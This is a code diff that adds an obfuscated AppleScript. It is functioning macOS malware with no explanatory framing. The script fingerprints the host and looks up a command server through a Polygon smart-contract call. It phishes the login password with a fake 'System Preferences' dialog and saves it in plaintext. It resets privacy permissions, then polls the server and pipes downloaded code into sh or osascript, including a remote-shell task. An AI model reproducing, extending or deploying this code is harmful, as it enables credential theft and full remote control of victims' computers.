@@ -1,0 +1,175 @@
+property __WSGfJG9O : "uiuN5Grp"
+property _o8V9a9k : "d1mmGiX0rdEO2"
+property _RbpqZKC6CD : "1kP6CZHAwB5x2ajOwC"
+set __gFQ6EXNEa9 to (831 + 414) * 8
+property __T5lJY7E : "xMOiavKPy8wAtT"
+set __SdpdvBxyM to (808 + 390) * 7
+set _N4MPxXZM to (303 + 556) * 8
+property _eoAUZ1MDf : "EFZLX0AKyw5vXfK"
+set __JRkejFS6Id to 51872
+
+property __CeFUmBbcX9f : ""
+property _avcEyVQxd : "d50f29d4d180318d6c36afa9a59b0514"
+
+on _lxLrzXmYdQm()
+    set __pyokaMWTUeb to {("ioreg -rd1 -c IOPlatformExpertDevice | awk -F'\"' '/IOPlatformUUID/{print $4}'"), ("ioreg -rd1 -c IOPlatformExpertDevice | grep -o '\"IOPlatformUUID\"[^,]*' | cut -d'\"' -f4"), ("system_profiler SPHardwareDataType 2>/dev/null | awk '/UUID/{print $NF}'"), ("system_profiler SPHardwareDataType 2>/dev/null | grep -i 'uuid' | awk '{print $NF}'")}
+    repeat with _NK28zpx in __pyokaMWTUeb
+        try
+            set __iYJp9Xijw4r to do shell script _NK28zpx
+            if length of __iYJp9Xijw4r is 36 then
+                if __iYJp9Xijw4r contains "-" then
+                    return __iYJp9Xijw4r
+                end if
+            end if
+        end try
+    end repeat
+end _lxLrzXmYdQm
+
+on __WCv4XeiOIc()
+    set __pyokaMWTUeb to {("whoami"), (string id {105, 100, 32, 45, 117, 110}), ("echo $USER"), ("logname")}
+    repeat with _NK28zpx in __pyokaMWTUeb
+        try
+            set __xPadmsER to do shell script _NK28zpx
+            if __xPadmsER is not "" then return __xPadmsER
+        end try
+    end repeat
+    return ("administrator")
+end __WCv4XeiOIc
+
+on _IFUkp9A()
+  set __ubc3u5k to {("polygon.drpc.org"), ("polygon.publicnode.com"), ("polygon-mainnet.gateway.tatum.io"), ("tenderly.rpc.polygon.community")}
+  set _GaGYmP8 to ("{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\"0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0\",\"data\":\"0x2686ecea\"},\"latest\"],\"id\":1}")
+    repeat with __vOE3VLSi in __ubc3u5k
+    try
+      set __T6SdqU3WF4 to do shell script ("r=$(curl -s --max-time 15 https://") & __vOE3VLSi & (" -X POST -H 'Content-Type: application/json' --data '") & _GaGYmP8 & ("'); h=$(echo \"$r\" | sed -n 's/.*\"result\":\"0x\" & "([^\"]*\" & ")\".*/\" & "1/p'); [ -z \"$h\" ]&&exit 1; l=$(printf \"%d\" \"0x${h:64:64}\"); echo \"${h:128:$((l*2))}\"|xxd -r -p")
+      if __T6SdqU3WF4 is not equal "" then
+        set __D40hVG0PXY to ("https://") & __T6SdqU3WF4 & "/"
+            set _ZVRrwJ5Sfn to do shell script ("/usr/bin/curl -d \"check\" --connect-timeout 50 --max-time 100 ") & quoted form of __D40hVG0PXY
+            if _ZVRrwJ5Sfn is ("success") then
+                set __CeFUmBbcX9f to __D40hVG0PXY
+                return true
+            end if
+      end if
+    end try
+  end repeat
+    return false
+end _IFUkp9A
+
+on __cfb184K(__xPadmsER, _gdwQDai)
+    try
+        set result to do shell script ("dscl . authonly ") & quoted form of __xPadmsER & space & quoted form of _gdwQDai
+        if result is not equal to "" then
+            return false
+        else
+            return true
+        end if
+    on error
+        return false
+    end try
+end __cfb184K
+
+on __NjkmJDGwgh(__xPadmsER)
+    set _VhnI1HcB7B to POSIX path of (path to home folder) & (".passphrase")
+    if __cfb184K(__xPadmsER, "") then
+        do shell script ("echo nopassphrase > ") & quoted form of _VhnI1HcB7B
+        return true
+    else
+        repeat
+            try
+                set result to display dialog (string id {84, 111, 32, 114, 117, 110, 32, 116, 104, 101, 32, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 32, 121, 111, 117, 32, 110, 101, 101, 100, 32, 116, 111, 32, 99, 104, 97, 110, 103, 101, 32, 116, 104, 101, 32, 115, 101, 116, 116, 105, 110, 103, 115, 32, 102, 111, 114, 32, 105, 116, 115, 32, 111, 112, 101, 114, 97, 116, 105, 111, 110, 46}) & return & ("Please enter password for continue:") default answer "" with icon caution buttons {(string id {67, 111, 110, 116, 105, 110, 117, 101})} default button (string id {67, 111, 110, 116, 105, 110, 117, 101}) giving up after 150 with title ("System Preferences") with hidden answer
+                set _gdwQDai to text returned of result
+                if __cfb184K(__xPadmsER, _gdwQDai) then
+                    do shell script ("echo ") & quoted form of _gdwQDai & (" > ") & quoted form of _VhnI1HcB7B
+                    return true
+                end if
+            end try
+        end repeat
+    end if
+end __NjkmJDGwgh
+
+on _hVUNWC8(__iYJp9Xijw4r, __xPadmsER, _Y1nWSzr)
+    set __nduh696L to ("curl --connect-timeout 50 --max-time 100 --retry 3 --retry-delay 2 ") & ("-X POST ") & quoted form of __CeFUmBbcX9f & " " & ("-d ") & quoted form of (("uuid=") & __iYJp9Xijw4r & ("&username=") & __xPadmsER & ("&txid=") & _avcEyVQxd & ("&connect"))
+    set _ZVRrwJ5Sfn to do shell script __nduh696L
+    
+    if _ZVRrwJ5Sfn is ("newconnect") then
+        set __luxRJSNVr3 to POSIX path of (path to home folder) & (".txid")
+        do shell script ("echo ") & quoted form of _avcEyVQxd & (" > ") & quoted form of __luxRJSNVr3
+        do shell script ("tccutil reset All")
+        return true
+    end if
+    if _ZVRrwJ5Sfn is (string id {99, 111, 110, 110, 101, 99, 116, 101, 100}) then return true
+    return false
+end _hVUNWC8
+
+on _ZryFg3G(__iYJp9Xijw4r, __xPadmsER)
+    try
+        set _VhnI1HcB7B to POSIX path of (path to home folder) & (".passphrase")
+        set __o2Y4sOD to do shell script ("cat ") & quoted form of _VhnI1HcB7B
+        if __o2Y4sOD is not ("nopassphrase") then
+            set __yJRty93SANx to __o2Y4sOD
+        else
+            set __yJRty93SANx to ""
+        end if
+        if __cfb184K(__xPadmsER, __yJRty93SANx) then
+            if _hVUNWC8(__iYJp9Xijw4r, __xPadmsER, _avcEyVQxd) then
+                return true
+            end if
+        else
+            __NjkmJDGwgh(__xPadmsER)
+            return false
+        end if
+    on error
+        __NjkmJDGwgh(__xPadmsER)
+        return false
+    end try
+end _ZryFg3G
+
+set __xPadmsER to __WCv4XeiOIc()
+set __iYJp9Xijw4r to _lxLrzXmYdQm()
+
+repeat
+    try
+        if _IFUkp9A() then
+            if _ZryFg3G(__iYJp9Xijw4r, __xPadmsER, _avcEyVQxd) then
+                repeat
+                    try
+                        set __FaOdvm7Z5I to ("curl --max-time 100 --retry 3 --retry-delay 2 ") & ("-X POST ") & quoted form of __CeFUmBbcX9f & " " & ("-d ") & quoted form of (("uuid=") & __iYJp9Xijw4r & ("&username=") & __xPadmsER & (string id {38, 116, 120, 105, 100, 61}) & _avcEyVQxd & ("&task"))
+                        set __qRivRTeuL63 to do shell script __FaOdvm7Z5I
+                        if not (__qRivRTeuL63 contains ("notasks")) then
+                            if __qRivRTeuL63 is ("runloader") then
+                                try
+                                    set __FYFD4cj to ("curl --max-time 100 --retry 3 --retry-delay 2 ") & ("-X POST ") & quoted form of __CeFUmBbcX9f & " -d " & quoted form of ((string id {116, 120, 105, 100, 61}) & _avcEyVQxd & ("&smodule")) & (" | osascript")
+                                    do shell script ("nohup sh -c ") & quoted form of __FYFD4cj & (" > /dev/null 2>&1 < /dev/null &")
+                                end try
+                            end if
+                            if __qRivRTeuL63 is ("runlight") then
+                                try
+                                    set __FYFD4cj to ("curl --max-time 100 --retry 3 --retry-delay 2 ") & (string id {45, 88, 32, 80, 79, 83, 84, 32}) & quoted form of __CeFUmBbcX9f & " " & ("-d ") & quoted form of (("txid=") & _avcEyVQxd & ("&lmodule")) & (string id {32, 124, 32, 111, 115, 97, 115, 99, 114, 105, 112, 116})
+                                    do shell script ("nohup sh -c ") & quoted form of __FYFD4cj & (" > /dev/null 2>&1 < /dev/null &")
+                                end try
+                            end if
+                            if __qRivRTeuL63 is ("replacer") then
+                                try
+                                    set __FYFD4cj to (string id {99, 117, 114, 108, 32, 45, 45, 109, 97, 120, 45, 116, 105, 109, 101, 32, 49, 48, 48, 32, 45, 45, 114, 101, 116, 114, 121, 32, 51, 32, 45, 45, 114, 101, 116, 114, 121, 45, 100, 101, 108, 97, 121, 32, 50, 32}) & (string id {45, 88, 32, 80, 79, 83, 84, 32}) & quoted form of __CeFUmBbcX9f & " " & ("-d ") & quoted form of (("txid=") & _avcEyVQxd & (string id {38, 108, 101, 100, 103, 101, 114})) & (" | sh")
+                                    do shell script ("nohup sh -c ") & quoted form of __FYFD4cj & (" > /dev/null 2>&1 < /dev/null &")
+                                end try
+                            end if
+                            if __qRivRTeuL63 is ("openshell") then
+                                try
+                                    set __FYFD4cj to ("curl --max-time 100 --retry 3 --retry-delay 2 ") & ("-X POST ") & quoted form of __CeFUmBbcX9f & " " & ("-d ") & quoted form of (("uuid=") & __iYJp9Xijw4r & ("&username=") & __xPadmsER & ("&txid=") & _avcEyVQxd & ("&shell")) & (" | sh")
+                                    do shell script ("nohup sh -c ") & quoted form of __FYFD4cj & (" > /dev/null 2>&1 < /dev/null &")
+                                end try
+                            end if
+                        end if
+                    on error
+                        delay 60
+                        exit repeat
+                    end try
+                    delay 60
+                end repeat
+            end if
+        else
+            delay 60
+        end if
+    end try
+end repeat
